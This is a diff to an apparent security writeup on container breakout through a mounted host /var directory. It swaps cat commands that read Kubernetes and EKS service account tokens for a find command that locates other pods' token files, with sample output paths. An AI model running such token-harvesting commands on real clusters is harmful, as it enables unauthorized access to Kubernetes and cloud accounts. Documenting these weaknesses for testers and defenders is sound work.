@@ -235,8 +235,12 @@ The container can read K8s serviceaccount tokens or AWS webidentity tokens
 which allows the container to gain unauthorized access to K8s or cloud:
 
 ```bash
-/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
-/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
+/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
+<SNIP>
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
+/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
 ```
 
 #### Docker
@@ -265,7 +269,7 @@ drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044
 #### Note
 
 The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
-locate the other containers' filesystems
+locate the other containers' filesystems and SA / web identity tokens
 
 
 
